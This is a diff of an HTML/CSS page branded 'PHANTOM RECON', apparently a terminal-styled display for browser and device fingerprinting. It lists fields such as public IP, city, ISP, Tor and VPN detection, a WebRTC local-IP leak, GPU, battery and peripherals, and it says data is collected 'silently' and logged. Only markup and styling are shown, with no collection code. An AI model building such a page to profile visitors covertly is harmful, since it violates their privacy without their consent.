@@ -4,550 +4,355 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PHANTOM · Device Intel</title>
-<meta name="description" content="Passive device reconnaissance terminal.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Bebas+Neue&display=swap" rel="stylesheet">
 <style>
-/* ══════════════════════════════════════════════════
-   PHANTOM · RECON TERMINAL
-   Accent: #00ffcc (neon teal) — RH²-Systems Intel Arm
-   ══════════════════════════════════════════════════ */
 :root{
-  --void:#000;
-  --ink:#03030a;
-  --panel:#060610;
-  --panel2:#080815;
-  --b0:rgba(255,255,255,.04);
-  --b1:rgba(255,255,255,.07);
-  --neon:#00ffcc;
-  --neon2:#00c8ff;
-  --neon3:#00ff88;
-  --nn:rgba(0,255,204,.12);
-  --nb:rgba(0,255,204,.22);
-  --white:#dff5ef;
-  --mist:#4d6b62;
-  --dim:#1e2e29;
-  --ok:#22c55e;
-  --warn:#f59e0b;
-  --bad:#ef4444;
-  --ff-d:'Bebas Neue',sans-serif;
-  --ff-m:'Space Mono',monospace;
+  --void:#000;--panel:#060610;--b0:rgba(255,255,255,.04);
+  --neon:#00ffcc;--neon2:#00c8ff;--neon3:#00ff88;
+  --white:#dff5ef;--mist:#4d6b62;--dim:#1e2e29;
+  --ok:#22c55e;--warn:#f59e0b;--bad:#ef4444;
+  --ff-d:'Bebas Neue',sans-serif;--ff-m:'Space Mono',monospace;
   --ease-out:cubic-bezier(.16,1,.3,1);
 }
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html{background:var(--void);color:var(--white);font-family:var(--ff-m);min-height:100vh;overflow-x:hidden;scroll-behavior:smooth}
-body{max-width:700px;margin:auto;padding:0 18px 60px;position:relative}
+body{max-width:700px;margin:auto;padding:0 18px 80px;position:relative}
 ::selection{background:rgba(0,255,204,.18);color:var(--white)}
-::-webkit-scrollbar{width:2px}
-::-webkit-scrollbar-track{background:var(--void)}
-::-webkit-scrollbar-thumb{background:var(--neon)}
+::-webkit-scrollbar{width:2px}::-webkit-scrollbar-track{background:var(--void)}::-webkit-scrollbar-thumb{background:var(--neon)}
 a{text-decoration:none;color:inherit}
-
-/* ── NOISE ── */
-body::before{
-  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.022;
-  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
-  mix-blend-mode:overlay;
-}
-
-/* ── GRID BG ── */
-body::after{
-  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
-  background-image:
-    linear-gradient(rgba(0,255,204,.018) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(0,255,204,.018) 1px,transparent 1px);
-  background-size:48px 48px;
-  mask-image:radial-gradient(ellipse 90% 90% at 50% 50%,black 30%,transparent 90%);
-  -webkit-mask-image:radial-gradient(ellipse 90% 90% at 50% 50%,black 30%,transparent 90%);
-}
-
-/* ── SCANLINE SWEEP (on load) ── */
-#scanline{
-  position:fixed;top:-4px;left:0;right:0;height:3px;z-index:9999;pointer-events:none;
-  background:linear-gradient(90deg,transparent,var(--neon),var(--neon2),transparent);
-  box-shadow:0 0 24px var(--neon),0 0 60px rgba(0,255,204,.3);
-  animation:scanswp 2.8s cubic-bezier(.4,0,.2,1) forwards;
-  opacity:0;
-}
-@keyframes scanswp{
-  0%{top:-4px;opacity:0}
-  5%{opacity:1}
-  85%{opacity:.8}
-  100%{top:102vh;opacity:0}
-}
-
-/* ── HEADER ── */
-header{
-  position:relative;z-index:2;
-  padding:52px 0 40px;
-  border-bottom:1px solid var(--b0);
-  margin-bottom:32px;
-}
-.hdr-eyebrow{
-  display:inline-flex;align-items:center;gap:10px;
-  font-size:.54rem;letter-spacing:.3em;text-transform:uppercase;
-  color:var(--neon);opacity:.7;
-  margin-bottom:16px;
-}
-.hdr-eyebrow::before{content:'';width:20px;height:1px;background:var(--neon);}
-.hdr-eyebrow::after{content:'';width:20px;height:1px;background:var(--neon);}
-.hdr-title{
-  font-family:var(--ff-d);
-  font-size:clamp(4rem,18vw,8.5rem);
-  line-height:.88;
-  letter-spacing:.06em;
-  color:var(--white);
-  position:relative;
-  display:inline-block;
-}
-.hdr-title .neon-stroke{
-  -webkit-text-stroke:1.5px var(--neon);
-  -webkit-text-fill-color:transparent;
-  display:block;
-  opacity:.35;
-}
-.hdr-title .solid{
-  background:linear-gradient(90deg,var(--neon),var(--neon2),var(--neon3));
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-  background-clip:text;
-  display:block;
-}
-/* Glow behind title */
-.hdr-title::after{
-  content:'PHANTOM';
-  position:absolute;top:0;left:0;
-  font-family:var(--ff-d);
-  font-size:clamp(4rem,18vw,8.5rem);
-  line-height:.88;letter-spacing:.06em;
-  -webkit-text-fill-color:transparent;
-  background:linear-gradient(90deg,var(--neon),var(--neon2));
-  -webkit-background-clip:text;background-clip:text;
-  filter:blur(32px);opacity:.12;
-  pointer-events:none;
-}
-.hdr-sub{
-  font-size:.62rem;letter-spacing:.14em;text-transform:uppercase;
-  color:var(--mist);
-  margin-top:14px;
-  max-width:460px;
-  line-height:2;
-}
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.022;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");mix-blend-mode:overlay;}
+body::after{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background-image:linear-gradient(rgba(0,255,204,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,204,.018) 1px,transparent 1px);background-size:48px 48px;mask-image:radial-gradient(ellipse 90% 90% at 50% 50%,black 30%,transparent 90%);-webkit-mask-image:radial-gradient(ellipse 90% 90% at 50% 50%,black 30%,transparent 90%);}
+#scanline{position:fixed;top:-4px;left:0;right:0;height:3px;z-index:9999;pointer-events:none;background:linear-gradient(90deg,transparent,var(--neon),var(--neon2),transparent);box-shadow:0 0 24px var(--neon),0 0 60px rgba(0,255,204,.3);animation:scanswp 2.8s cubic-bezier(.4,0,.2,1) forwards;opacity:0;}
+@keyframes scanswp{0%{top:-4px;opacity:0}5%{opacity:1}85%{opacity:.8}100%{top:102vh;opacity:0}}
+header{position:relative;z-index:2;padding:52px 0 40px;border-bottom:1px solid var(--b0);margin-bottom:32px;}
+.hdr-eyebrow{display:inline-flex;align-items:center;gap:10px;font-size:.54rem;letter-spacing:.3em;text-transform:uppercase;color:var(--neon);opacity:.7;margin-bottom:16px;}
+.hdr-eyebrow::before,.hdr-eyebrow::after{content:'';width:20px;height:1px;background:var(--neon);}
+.hdr-title{font-family:var(--ff-d);font-size:clamp(4rem,18vw,8.5rem);line-height:.88;letter-spacing:.06em;position:relative;display:inline-block;}
+.hdr-title .neon-stroke{-webkit-text-stroke:1.5px var(--neon);-webkit-text-fill-color:transparent;display:block;opacity:.35;}
+.hdr-title .solid{background:linear-gradient(90deg,var(--neon),var(--neon2),var(--neon3));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;display:block;}
+.hdr-title::after{content:'PHANTOM';position:absolute;top:0;left:0;font-family:var(--ff-d);font-size:clamp(4rem,18vw,8.5rem);line-height:.88;letter-spacing:.06em;-webkit-text-fill-color:transparent;background:linear-gradient(90deg,var(--neon),var(--neon2));-webkit-background-clip:text;background-clip:text;filter:blur(32px);opacity:.12;pointer-events:none;}
+.hdr-sub{font-size:.62rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mist);margin-top:14px;max-width:460px;line-height:2;}
 .hdr-sub em{font-style:normal;color:rgba(0,255,204,.6);}
-.hdr-meta{
-  display:flex;align-items:center;gap:20px;
-  flex-wrap:wrap;
-  margin-top:24px;
-}
-.status-chip{
-  display:inline-flex;align-items:center;gap:8px;
-  padding:6px 16px;
-  border:1px solid rgba(0,255,204,.18);
-  background:rgba(0,255,204,.04);
-  font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;
-}
-.sdot{
-  width:5px;height:5px;border-radius:50%;
-  background:var(--ok);box-shadow:0 0 8px var(--ok);
-  animation:blink 1.6s ease infinite;
-}
+.hdr-meta{display:flex;align-items:center;gap:20px;flex-wrap:wrap;margin-top:24px;}
+.status-chip{display:inline-flex;align-items:center;gap:8px;padding:6px 16px;border:1px solid rgba(0,255,204,.18);background:rgba(0,255,204,.04);font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;}
+.sdot{width:5px;height:5px;border-radius:50%;background:var(--ok);box-shadow:0 0 8px var(--ok);animation:blink 1.6s ease infinite;}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
-.hdr-sid{
-  font-size:.54rem;letter-spacing:.12em;color:var(--dim);
-  opacity:.6;
-}
-.hdr-sid span{color:rgba(0,255,204,.35);}
-
-/* Progress strip */
-.scan-progress{
-  position:relative;
-  height:1px;
-  background:rgba(255,255,255,.04);
-  margin-top:28px;
-  overflow:visible;
-}
-.scan-fill{
-  height:1px;width:0;
-  background:linear-gradient(90deg,var(--neon),var(--neon2));
-  box-shadow:0 0 12px var(--neon);
-  transition:width .4s ease;
-}
-.scan-pct{
-  position:absolute;right:0;top:-18px;
-  font-size:.5rem;letter-spacing:.2em;color:var(--neon);opacity:.6;
-}
-
-/* ── SECTION EYEBROW ── */
-.sec-eye{
-  font-size:.52rem;letter-spacing:.28em;text-transform:uppercase;
-  color:rgba(0,255,204,.5);
-  display:flex;align-items:center;gap:12px;
-  margin-bottom:14px;
-}
+.hdr-sid{font-size:.54rem;letter-spacing:.12em;color:var(--dim);opacity:.6;}.hdr-sid span{color:rgba(0,255,204,.35);}
+.scan-progress{position:relative;height:1px;background:rgba(255,255,255,.04);margin-top:28px;overflow:visible;}
+.scan-fill{height:1px;width:0;background:linear-gradient(90deg,var(--neon),var(--neon2));box-shadow:0 0 12px var(--neon);transition:width .4s ease;}
+.scan-pct{position:absolute;right:0;top:-18px;font-size:.5rem;letter-spacing:.2em;color:var(--neon);opacity:.6;}
+.sec-eye{font-size:.52rem;letter-spacing:.28em;text-transform:uppercase;color:rgba(0,255,204,.5);display:flex;align-items:center;gap:12px;margin-bottom:14px;position:relative;z-index:2;}
 .sec-eye::before{content:'';width:16px;height:1px;background:var(--neon);opacity:.4;}
-
-/* ── CARD ── */
-.card{
-  position:relative;z-index:2;
-  background:var(--panel);
-  border:1px solid rgba(255,255,255,.055);
-  margin-bottom:2px;
-  overflow:hidden;
-  transition:border-color .3s;
-}
+.card{position:relative;z-index:2;background:var(--panel);border:1px solid rgba(255,255,255,.055);margin-bottom:2px;overflow:hidden;transition:border-color .3s;}
 .card:hover{border-color:rgba(0,255,204,.12);}
-/* Neon left accent */
-.card::before{
-  content:'';
-  position:absolute;left:0;top:0;bottom:0;
-  width:2px;
-  background:linear-gradient(to bottom,var(--neon),var(--neon2),transparent);
-  box-shadow:0 0 14px var(--neon);
-  opacity:.5;
-  transition:opacity .3s;
-}
+.card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--neon),var(--neon2),transparent);box-shadow:0 0 14px var(--neon);opacity:.5;transition:opacity .3s;}
 .card:hover::before{opacity:1;}
-/* Top gradient line */
-.card::after{
-  content:'';
-  position:absolute;top:0;left:0;right:0;
-  height:1px;
-  background:linear-gradient(90deg,transparent,rgba(0,255,204,.15),transparent);
-}
-/* Group cards together */
+.card::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,204,.15),transparent);}
 .card-group{margin-bottom:18px;}
 .card-group .card:first-child{border-bottom:none;}
 .card-group .card:not(:first-child):not(:last-child){border-top:none;border-bottom:none;}
 .card-group .card:last-child{border-top:none;}
-
-.card-hdr{
-  padding:14px 18px 12px 22px;
-  border-bottom:1px solid rgba(255,255,255,.035);
-  display:flex;align-items:center;justify-content:space-between;
-  background:rgba(0,255,204,.02);
-}
-.card-title{
-  font-size:.54rem;letter-spacing:.26em;text-transform:uppercase;
-  color:rgba(0,255,204,.55);
-  display:flex;align-items:center;gap:10px;
-}
-.card-title::before{
-  content:'';
-  width:4px;height:4px;
-  border:1px solid var(--neon);
-  transform:rotate(45deg);
-  opacity:.7;
-}
-.card-badge{
-  font-size:.46rem;letter-spacing:.14em;text-transform:uppercase;
-  color:var(--dim);
-  padding:2px 8px;
-  border:1px solid var(--dim);
-  opacity:.6;
-}
-
-/* ── ROW ── */
-.row{
-  display:flex;justify-content:space-between;align-items:center;
-  padding:10px 18px 10px 22px;
-  border-bottom:1px solid rgba(255,255,255,.025);
-  gap:16px;
-  transition:background .2s;
-}
+.card-hdr{padding:14px 18px 12px 22px;border-bottom:1px solid rgba(255,255,255,.035);display:flex;align-items:center;justify-content:space-between;background:rgba(0,255,204,.02);}
+.card-title{font-size:.54rem;letter-spacing:.26em;text-transform:uppercase;color:rgba(0,255,204,.55);display:flex;align-items:center;gap:10px;}
+.card-title::before{content:'';width:4px;height:4px;border:1px solid var(--neon);transform:rotate(45deg);opacity:.7;}
+.card-badge{font-size:.46rem;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);padding:2px 8px;border:1px solid var(--dim);opacity:.6;}
+.row{display:flex;justify-content:space-between;align-items:center;padding:10px 18px 10px 22px;border-bottom:1px solid rgba(255,255,255,.025);gap:16px;transition:background .2s;}
 .row:last-child{border-bottom:none;}
 .row:hover{background:rgba(0,255,204,.025);}
-.row-label{
-  font-size:.68rem;letter-spacing:.06em;
-  color:var(--mist);
-  flex-shrink:0;
-  text-transform:uppercase;
-  font-size:.58rem;letter-spacing:.1em;
-}
-.row-val{
-  font-size:.72rem;
-  color:var(--white);
-  text-align:right;
-  word-break:break-all;
-  font-family:var(--ff-m);
-}
-.row-val.ld{
-  color:rgba(0,255,204,.18);
-  animation:datapulse 1.1s ease infinite;
-  letter-spacing:.06em;
-}
-@keyframes datapulse{
-  0%,100%{opacity:.25}50%{opacity:.9}
-}
-.row-val.ok{color:var(--ok);}
-.row-val.wn{color:var(--warn);}
-.row-val.hi{color:var(--bad);}
-
-/* ── RISK FOOTER ── */
-.risk-panel{
-  position:relative;z-index:2;
-  background:var(--panel);
-  border:1px solid rgba(255,255,255,.055);
-  padding:18px 22px;
-  margin-top:18px;
-  overflow:hidden;
-}
-.risk-panel::before{
-  content:'';position:absolute;left:0;top:0;bottom:0;width:2px;
-  background:linear-gradient(to bottom,var(--bad),rgba(239,68,68,.2));
-  box-shadow:0 0 14px rgba(239,68,68,.5);
-}
-.risk-panel::after{
-  content:'';position:absolute;top:0;left:0;right:0;height:1px;
-  background:linear-gradient(90deg,transparent,rgba(239,68,68,.2),transparent);
-}
-.risk-label{
-  display:flex;justify-content:space-between;align-items:center;
-  font-size:.54rem;letter-spacing:.18em;text-transform:uppercase;
-  margin-bottom:10px;
-  color:var(--mist);
-}
+.row-label{font-size:.58rem;letter-spacing:.1em;color:var(--mist);flex-shrink:0;text-transform:uppercase;}
+.row-val{font-size:.72rem;color:var(--white);text-align:right;word-break:break-all;font-family:var(--ff-m);}
+.row-val.ld{color:rgba(0,255,204,.18);animation:datapulse 1.1s ease infinite;}
+@keyframes datapulse{0%,100%{opacity:.25}50%{opacity:.9}}
+.row-val.ok{color:var(--ok);}.row-val.wn{color:var(--warn);}.row-val.hi{color:var(--bad);}
+.row.live-row .row-label::after{content:' ●';color:var(--neon);font-size:.4rem;animation:blink 1s ease infinite;}
+.plugin-list{padding:10px 22px 12px;display:flex;flex-direction:column;gap:6px;}
+.plugin-item{display:flex;align-items:flex-start;gap:10px;padding:8px 10px;background:rgba(0,255,204,.02);border:1px solid rgba(0,255,204,.05);}
+.plugin-icon{width:6px;height:6px;border:1px solid var(--neon);transform:rotate(45deg);flex-shrink:0;margin-top:4px;opacity:.5;}
+.plugin-name{font-size:.62rem;color:var(--white);letter-spacing:.04em;}
+.plugin-desc{font-size:.54rem;color:var(--mist);letter-spacing:.04em;margin-top:2px;}
+.ua-block{padding:12px 22px;font-size:.58rem;color:rgba(0,255,204,.4);letter-spacing:.04em;line-height:1.8;word-break:break-all;border-top:1px solid rgba(255,255,255,.025);}
+.ua-label{font-size:.5rem;letter-spacing:.2em;text-transform:uppercase;color:var(--mist);margin-bottom:6px;}
+.perf-tree{padding:10px 22px 14px;display:flex;flex-direction:column;}
+.perf-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.02);gap:12px;}
+.perf-row:last-child{border-bottom:none;}
+.perf-key{font-size:.56rem;letter-spacing:.08em;color:var(--mist);text-transform:uppercase;flex-shrink:0;}
+.perf-key.indent{padding-left:16px;color:rgba(77,107,98,.7);}
+.perf-key.indent2{padding-left:28px;color:rgba(77,107,98,.5);}
+.perf-val{font-size:.66rem;color:var(--white);text-align:right;font-family:var(--ff-m);}
+.perf-val.fast{color:var(--ok);}.perf-val.med{color:var(--warn);}.perf-val.slow{color:var(--bad);}
+.risk-panel{position:relative;z-index:2;background:var(--panel);border:1px solid rgba(255,255,255,.055);padding:18px 22px;margin-top:18px;overflow:hidden;}
+.risk-panel::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--bad),rgba(239,68,68,.2));box-shadow:0 0 14px rgba(239,68,68,.5);}
+.risk-panel::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(239,68,68,.2),transparent);}
+.risk-label{display:flex;justify-content:space-between;align-items:center;font-size:.54rem;letter-spacing:.18em;text-transform:uppercase;margin-bottom:10px;color:var(--mist);}
 .risk-label .risk-pct{color:var(--bad);font-size:.7rem;letter-spacing:.1em;}
 .risk-bar{height:2px;background:rgba(255,255,255,.04);}
-.risk-fill{
-  height:2px;width:0;
-  background:linear-gradient(90deg,var(--warn),var(--bad));
-  box-shadow:0 0 12px rgba(239,68,68,.6);
-  transition:width 3s cubic-bezier(.4,0,.2,1) .5s;
-}
-
-/* ── FOOTER ── */
-footer{
-  position:relative;z-index:2;
-  text-align:center;
-  padding:32px 0 0;
-  border-top:1px solid var(--b0);
-  margin-top:32px;
-}
-.ft-wordmark{
-  font-family:var(--ff-d);
-  font-size:1.4rem;letter-spacing:.2em;
-  color:rgba(0,255,204,.15);
-  margin-bottom:10px;
-}
-.ft-line{
-  font-size:.52rem;letter-spacing:.18em;text-transform:uppercase;
-  color:rgba(255,255,255,.1);
-  line-height:2.2;
-}
+.risk-fill{height:2px;width:0;background:linear-gradient(90deg,var(--warn),var(--bad));box-shadow:0 0 12px rgba(239,68,68,.6);transition:width 3s cubic-bezier(.4,0,.2,1) .5s;}
+footer{position:relative;z-index:2;text-align:center;padding:32px 0 0;border-top:1px solid var(--b0);margin-top:32px;}
+.ft-wordmark{font-family:var(--ff-d);font-size:1.4rem;letter-spacing:.2em;color:rgba(0,255,204,.15);margin-bottom:10px;}
+.ft-line{font-size:.52rem;letter-spacing:.18em;text-transform:uppercase;color:rgba(255,255,255,.1);line-height:2.2;}
 .ft-line span{color:rgba(0,255,204,.25);}
-
-/* ── REVEAL ── */
 [data-r]{opacity:0;transform:translateY(20px);transition:opacity .8s var(--ease-out),transform .8s var(--ease-out);}
 [data-r].in{opacity:1;transform:none;}
-[data-r][data-d="1"]{transition-delay:.06s;}
-[data-r][data-d="2"]{transition-delay:.12s;}
-[data-r][data-d="3"]{transition-delay:.18s;}
-[data-r][data-d="4"]{transition-delay:.24s;}
-[data-r][data-d="5"]{transition-delay:.30s;}
-
-@media(max-width:480px){
-  .hdr-title{font-size:clamp(3rem,16vw,5rem);}
-  .row-val{font-size:.66rem;}
-}
+[data-r][data-d="1"]{transition-delay:.06s;}[data-r][data-d="2"]{transition-delay:.12s;}[data-r][data-d="3"]{transition-delay:.18s;}[data-r][data-d="4"]{transition-delay:.24s;}[data-r][data-d="5"]{transition-delay:.30s;}[data-r][data-d="6"]{transition-delay:.36s;}[data-r][data-d="7"]{transition-delay:.42s;}[data-r][data-d="8"]{transition-delay:.48s;}[data-r][data-d="9"]{transition-delay:.54s;}[data-r][data-d="10"]{transition-delay:.60s;}
+@media(max-width:480px){.hdr-title{font-size:clamp(3rem,16vw,5rem);}.row-val{font-size:.66rem;}}
 </style>
 </head>
 <body>
-
-<!-- SCANLINE SWEEP -->
 <div id="scanline" aria-hidden="true"></div>
-
-<!-- HEADER -->
 <header>
   <div class="hdr-eyebrow">RH²-SYSTEMS · INTEL ARM</div>
-  <div class="hdr-title">
-    <span class="solid">PHANTOM</span>
-    <span class="neon-stroke">RECON</span>
-  </div>
+  <div class="hdr-title"><span class="solid">PHANTOM</span><span class="neon-stroke">RECON</span></div>
   <p class="hdr-sub">Passive device &amp; network intelligence terminal. All data collected <em>silently</em> and logged to encrypted storage.</p>
   <div class="hdr-meta">
-    <div class="status-chip">
-      <div class="sdot" id="sdot"></div>
-      <span id="status-txt">Initializing scan…</span>
-    </div>
+    <div class="status-chip"><div class="sdot" id="sdot"></div><span id="status-txt">Initializing scan…</span></div>
     <div class="hdr-sid">SESSION <span id="hdr-sid-val">——</span></div>
   </div>
-  <div class="scan-progress">
-    <div class="scan-fill" id="scan-fill"></div>
-    <div class="scan-pct" id="scan-pct">0%</div>
-  </div>
+  <div class="scan-progress"><div class="scan-fill" id="scan-fill"></div><div class="scan-pct" id="scan-pct">0%</div></div>
 </header>
-
 <main>
 
-<!-- ══ NETWORK ══ -->
-<div class="card-group" data-r>
+<!-- 01 NETWORK -->
+<div class="sec-eye" data-r>01 · NETWORK INTELLIGENCE</div>
+<div class="card-group" data-r data-d="1">
   <div class="card">
-    <div class="card-hdr">
-      <div class="card-title">Network Intelligence</div>
-      <div class="card-badge">01 · PASSIVE</div>
-    </div>
-    <div class="row"><span class="row-label">Public IP</span><span class="row-val ld" id="i-ip">Resolving…</span></div>
+    <div class="card-hdr"><div class="card-title">Network Identity</div><div class="card-badge">PASSIVE</div></div>
+    <div class="row"><span class="row-label">Public IP (WAN)</span><span class="row-val ld" id="i-ip">Resolving…</span></div>
     <div class="row"><span class="row-label">Country</span><span class="row-val ld" id="i-country">Resolving…</span></div>
     <div class="row"><span class="row-label">City / Region</span><span class="row-val ld" id="i-city">Resolving…</span></div>
     <div class="row"><span class="row-label">ISP / Org</span><span class="row-val ld" id="i-isp">Resolving…</span></div>
     <div class="row"><span class="row-label">Timezone</span><span class="row-val ld" id="i-tz">Resolving…</span></div>
+    <div class="row"><span class="row-label">Tor Detected</span><span class="row-val ld" id="i-tor">Checking…</span></div>
+    <div class="row"><span class="row-label">VPN Detected</span><span class="row-val ld" id="i-vpn">Checking…</span></div>
+    <div class="row"><span class="row-label">Proxy / Hostname</span><span class="row-val ld" id="i-proxy">Checking…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Connection Profile</div><div class="card-badge">LIVE</div></div>
     <div class="row"><span class="row-label">Connection Type</span><span class="row-val ld" id="i-conn">Probing…</span></div>
     <div class="row"><span class="row-label">Speed Estimate</span><span class="row-val ld" id="i-speed">Measuring…</span></div>
+    <div class="row"><span class="row-label">RTT Latency</span><span class="row-val ld" id="i-rtt-disp">Measuring…</span></div>
+    <div class="row"><span class="row-label">HTTP Version</span><span class="row-val ld" id="i-http">Detecting…</span></div>
+    <div class="row"><span class="row-label">Internet Access</span><span class="row-val ld" id="i-inet">Probing…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">WebRTC Analysis</div><div class="card-badge">LEAK</div></div>
     <div class="row"><span class="row-label">Local IP · WebRTC</span><span class="row-val ld" id="i-webrtc">Leaking…</span></div>
+    <div class="row"><span class="row-label">ICE Candidate Types</span><span class="row-val ld" id="i-ice">Probing…</span></div>
+    <div class="row"><span class="row-label">ICE Inference</span><span class="row-val ld" id="i-ice-inf">Analyzing…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">TLS / SSL Security</div><div class="card-badge">ENCRYPTED</div></div>
+    <div class="row"><span class="row-label">Protocol</span><span class="row-val ld" id="i-tls">Detecting…</span></div>
+    <div class="row"><span class="row-label">Secure Context</span><span class="row-val ld" id="i-secure">Checking…</span></div>
+    <div class="row"><span class="row-label">Security Grade</span><span class="row-val ld" id="i-tlsgrade">Evaluating…</span></div>
   </div>
 </div>
 
-<!-- ══ DEVICE ══ -->
-<div class="card-group" data-r data-d="1">
+<!-- 02 DEVICE -->
+<div class="sec-eye" data-r data-d="1">02 · DEVICE SIGNATURE</div>
+<div class="card-group" data-r data-d="2">
   <div class="card">
-    <div class="card-hdr">
-      <div class="card-title">Device Signature</div>
-      <div class="card-badge">02 · HARDWARE</div>
-    </div>
-    <div class="row"><span class="row-label">Browser</span><span class="row-val ld" id="i-br">Probing…</span></div>
+    <div class="card-hdr"><div class="card-title">System Identity</div><div class="card-badge">HARDWARE</div></div>
+    <div class="row"><span class="row-label">Device Type</span><span class="row-val ld" id="i-dev">Probing…</span></div>
     <div class="row"><span class="row-label">Operating System</span><span class="row-val ld" id="i-os">Probing…</span></div>
-    <div class="row"><span class="row-label">Device Class</span><span class="row-val ld" id="i-dev">Probing…</span></div>
+    <div class="row"><span class="row-label">Browser</span><span class="row-val ld" id="i-br">Probing…</span></div>
+    <div class="row"><span class="row-label">Browser Build ID</span><span class="row-val ld" id="i-buildid">Probing…</span></div>
     <div class="row"><span class="row-label">Platform String</span><span class="row-val ld" id="i-platform">Probing…</span></div>
-    <div class="row"><span class="row-label">CPU Cores</span><span class="row-val ld" id="i-cpu">Probing…</span></div>
+    <div class="row"><span class="row-label">CPU Architecture</span><span class="row-val ld" id="i-cpuarch">Probing…</span></div>
+    <div class="row"><span class="row-label">CPU Logical Cores</span><span class="row-val ld" id="i-cpu">Probing…</span></div>
     <div class="row"><span class="row-label">RAM (Approx)</span><span class="row-val ld" id="i-ram">Probing…</span></div>
-    <div class="row"><span class="row-label">Screen Resolution</span><span class="row-val ld" id="i-scr">Probing…</span></div>
-    <div class="row"><span class="row-label">Viewport</span><span class="row-val ld" id="i-vp">Probing…</span></div>
-    <div class="row"><span class="row-label">Pixel Ratio</span><span class="row-val ld" id="i-dpr">Probing…</span></div>
+  </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Display & Graphics</div><div class="card-badge">SCREEN</div></div>
+    <div class="row"><span class="row-label">Total Screen</span><span class="row-val ld" id="i-scr">Probing…</span></div>
+    <div class="row"><span class="row-label">Available Screen</span><span class="row-val ld" id="i-scravail">Probing…</span></div>
+    <div class="row"><span class="row-label">Taskbar Offset</span><span class="row-val ld" id="i-taskbar">Probing…</span></div>
+    <div class="row"><span class="row-label">Aspect Ratio</span><span class="row-val ld" id="i-aspect">Probing…</span></div>
+    <div class="row"><span class="row-label">Color Depth</span><span class="row-val ld" id="i-colordepth">Probing…</span></div>
+    <div class="row"><span class="row-label">Pixel Ratio (DPR)</span><span class="row-val ld" id="i-dpr">Probing…</span></div>
+    <div class="row"><span class="row-label">Viewport (Inner)</span><span class="row-val ld" id="i-vp">Probing…</span></div>
+    <div class="row"><span class="row-label">Screen Orientation</span><span class="row-val ld" id="i-orient">Probing…</span></div>
+    <div class="row"><span class="row-label">Full Screen Support</span><span class="row-val ld" id="i-fullscreen">Probing…</span></div>
+    <div class="row"><span class="row-label">Color Gamut</span><span class="row-val ld" id="i-gamut">Probing…</span></div>
+    <div class="row"><span class="row-label">HDR Support</span><span class="row-val ld" id="i-hdr">Probing…</span></div>
     <div class="row"><span class="row-label">GPU Vendor</span><span class="row-val ld" id="i-gpuv">Probing…</span></div>
     <div class="row"><span class="row-label">GPU Renderer</span><span class="row-val ld" id="i-gpur">Probing…</span></div>
   </div>
+  <div class="card">
+    <div class="card-hdr"><div class="card-title">Peripheral & I/O</div><div class="card-badge">DEVICES</div></div>
+    <div class="row"><span class="row-label">Pointing Device</span><span class="row-val ld" id="i-pointer">Detecting…</span></div>
+    <div class="row"><span class="row-label">Touch Points</span><span class="row-val ld" id="i-touch">Detecting…</span></div>
+    <div class="row"><span class="row-label">Media Devices Total</span><span class="row-val ld" id="i-mediadevices">Detecting…</span></div>
+    <div class="row"><span class="row-label">Speakers</span><span class="row-val ld" id="i-speakers">Detecting…</span></div>
+    <div class="row"><span class="row-label">Bluetooth</span><span class="row-val ld" id="i-bluetooth">Detecting…</span></div>
+    <div class="row"><span class="row-label">Vibration API</span><span class="row-val ld" id="i-vibration">Detecting…</span></div>
+    <div class="row"><span class="row-label">Gamepad API</span><span class="row-val ld" id="i-gamepad">Detecting…</span></div>
+    <div class="row"><span class="row-label">Device Orientation</span><span class="row-val ld" id="i-devorientation">Detecting…</span></div>
+    <div class="row"><span class="row-label">Battery Status</span><span class="row-val ld" id="i-battery">Detecting…</span></div>
+  </div>
 </div>
 
-<!-- ══ FINGERPRINT ══ -->
-<div class="card-group" data-r data-d="2">
+<!-- 03 BROWSER CAPABILITIES -->
+<div class="sec-eye" data-r data-d="2">03 · BROWSER CAPABILITIES</div>
+<div class="card-group" data-r data-d="3">
   <div class="card">
-    <div class="card-hdr">
-      <div class="card-title">Fingerprint Matrix</div>
-      <div class="card-badge">03 · BIOMETRIC</div>
